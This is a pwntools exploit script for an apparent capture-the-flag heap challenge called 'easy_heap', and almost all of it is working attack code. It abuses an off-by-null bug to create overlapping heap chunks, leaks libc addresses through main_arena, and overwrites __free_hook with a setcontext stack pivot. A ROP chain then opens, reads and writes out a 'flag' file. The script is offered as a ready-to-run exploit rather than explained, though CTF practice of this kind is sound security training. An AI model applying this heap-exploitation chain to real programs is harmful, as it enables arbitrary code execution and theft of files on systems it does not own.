#coding:utf-8
#version 1
from pwn import *
import sys

local = 1
context.terminal=['tmux','splitw','-h']
if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'):
    context.log_level = 'debug'

if local:
	p = process('./easy_heap')
        elf = ELF('./easy_heap',checksec = False)
        libc = elf.libc
else:
	p = remote("")

def debug(addr=0,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        print "breakpoint_addr --> " + hex(text_base + 0x202040)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr))) 

sd = lambda s:p.send(s)
rc = lambda s:p.recv(s)
sl = lambda s:p.sendline(s)
ru = lambda s:p.recvuntil(s)
sda = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)

def choice(idx):
    sla("Choice:",str(idx))

def add(size):
    choice(1)
    sla("Size: ",str(size))

def edit(idx,data):   #have a off by null
    choice(2)
    sla("Index: ",str(idx))
    sda("Content: \n",data)

def delete(idx):
    choice(3)
    sla("Index: ",str(idx))

def show(idx):
    choice(4)
    sla("Index: ",str(idx))

add(0x18)#0

add(0x6c08) #1
for i in range(7): #idx[2~8] 7 tool chunk
    add(0x28)

# now heap begin with 0x.....0010
add(0x1000) #9
add(0x18) #10 avoid to merg with top chunk
delete(9)
add(0x2000) #9 set chunk 0x1000 to largebin

add(0x28) #11
edit(11,p64(0)+p64(0x521)+p8(0x40))

add(0x28) #12
add(0x28) #13
add(0x28) #14
add(0x28) #15
for i in range(2,9):
    delete(i)

delete(14)
delete(12)
for i in range(7): #idx[2~8]
    add(0x28)

add(0x400) #12:set the chunk in fastbin to smallbin for set 0x...0040's bk
add(0x28) #14
add(0x28) #16
edit(14,p64(0)+p8(0x20))

# now set the chunk 0x....0010's fd
for i in range(2,9):
    delete(i)

delete(13)
delete(11)
for i in range(7):
    add(0x28)

add(0x28) #11
add(0x28) #13
edit(11,p8(0x20))

add(0x28) #17
add(0x5f8) #18
add(0x10) #19
edit(19,"/bin/sh\x00")
edit(17,'i'*0x20+p64(0x520)) #trigger off by null

add(0x4b8)
delete(18)
#debug()

show(12)
ru("Content: ")
main_arena = u64(rc(6).ljust(8,'\x00')) - 1648
malloc_hook = main_arena - 0x10
libc_base = malloc_hook - libc.symbols['__malloc_hook']
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
setcontext = libc_base + libc.symbols['setcontext']
log.info("main_arena --> %s",hex(main_arena))
log.info("free_hook --> %s",hex(free_hook))

pop_rax = 0x000000000004a550 + libc_base
pop_rdi = 0x0000000000026b72 + libc_base
pop_rsi = 0x0000000000027529 + libc_base
pop_rdx_r12 = 0x000000000011c1e1 + libc_base
syscall_ret = 0x0000000000066229 + libc_base
ret = 0x0000000000025679 + libc_base

pay = p64(0x1547a0 + libc_base) #mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]
pay = pay.ljust(0x20,'\x00')
pay += p64(setcontext+33)
pay = pay.ljust(0x38,'\x00')
pay += p64(0)*2 #r8,r9
pay = pay.ljust(0x68,'\x00')
pay += p64(0) + p64(0) #rdi,rsi
pay = pay.ljust(0x88,'\x00')
pay += p64(0) #rdx
pay = pay.ljust(0x98,'\x00')
pay += p64(0) #rcx
pay = pay.ljust(0xa0,'\x00') #return 
pay += p64(free_hook+0xf0) #stack
pay += p64(ret)
pay = pay.ljust(0xe0,'\x00')
pay += p64(free_hook)
pay += p64(ret) #ret
#open("flag")
flag = free_hook + 0x1b8
pay += p64(pop_rdi) + p64(flag)#0xb0 here is rop
#pay += p64(pop_rsi) + p64(0)
#pay += p64(pop_rdx_r12) + p64(0) + p64(0)
pay += p64(pop_rax) + p64(2)
pay += p64(syscall_ret)
#read(3,buf,0x200)
pay += p64(pop_rdi) + p64(3)
pay += p64(pop_rsi) + p64(free_hook & 0xfffffffffffff000) #buf
pay += p64(pop_rdx_r12) + p64(0x200) + p64(0)
pay += p64(pop_rax) + p64(0)
pay += p64(syscall_ret)
#write(1,buf,0x200)
pay += p64(pop_rdi) + p64(1)
pay += p64(pop_rsi) + p64(free_hook & 0xfffffffffffff000)
pay += p64(pop_rdx_r12) + p64(0x200) + p64(0)
pay += p64(pop_rax) + p64(1)
pay += p64(syscall_ret)
pay += "flag\x00"

delete(12)
add(0x1f8) #12
add(0x1f8) #18

delete(18)
delete(12)

edit(11,"\x00"*0x10 + p64(free_hook))
add(0x1f8) #12
add(0x1f8) #18 free_hook

edit(18,pay)

edit(0,'a'*8 + p64(free_hook))
delete(0)

#debug()

#debug()

p.interactive()
